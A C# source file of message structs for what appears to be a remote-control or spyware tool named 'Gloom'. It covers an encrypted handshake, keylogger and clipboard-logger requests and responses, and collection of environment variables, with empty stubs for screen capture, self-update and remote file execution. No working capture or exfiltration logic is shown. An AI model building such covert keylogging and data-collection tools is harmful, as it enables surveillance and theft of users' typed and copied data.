using System.Runtime.InteropServices;

namespace Gloom;

public static class OpStructs
{
	#region Handshake
	[Serializable]
	public struct ClientHello // SSL Client Hello + Client Key Exchange
	{
		public string Identifier { get; set; }
		public byte[] ClientRandom { get; set; }
		public byte[] DHParameter;
		public int KDFIterations { get; set; }
		public int KDFMemorySize { get; set; }
		public int KDFParallelism { get; set; }
	}

	[Serializable]
	public struct ServerHello // SSL Server Hello + Server Key Exchange
	{
		public byte[] ServerRandom { get; set; }
		public byte[] DHParameter { get; set; }
	}
	#endregion

	#region Global
	#endregion

	#region KeyLogger
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLoggerSettingRequest
	{
		public int Mode;
		public int SaveInterval;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLogRequest
	{
		public int LogCount;
	}

	[Serializable]
	public struct KeyLogResponse
	{
		public int LogIndex;
		public byte[] CompressedLog;
	}
	#endregion

	#region ClipboardLogger
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerRequest
	{
		public Guid RequestType;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerStateResponse
	{
		public bool Enabled;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLogResponse
	{
		public long TotalKeyStrokes;
		public byte[] CompressedKeyLog;
	}
	#endregion

	#region ScreenCapturer
	#endregion

	#region SelfUpdater
	#endregion

	#region InfoCollector
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct EnvVarsRequest
	{
	}

	[Serializable]
	public struct EnvVarsResponse
	{
		public List<(string, string)> Map;
	}
	#endregion

	#region FileIO
	#endregion

	#region Remote File Execution
	#endregion
}
